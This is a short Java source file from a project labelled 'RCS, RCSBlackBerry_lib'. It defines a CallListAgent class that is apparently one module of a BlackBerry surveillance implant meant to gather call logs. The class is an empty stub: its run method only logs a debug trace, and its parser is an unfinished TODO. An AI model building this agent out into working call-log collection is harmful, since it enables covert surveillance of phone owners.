/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallListAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class CallListAgent extends Agent {
    //#debug
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);

    public CallListAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");

    }

    protected CallListAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug debug
	debug.trace("run");

    }

    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
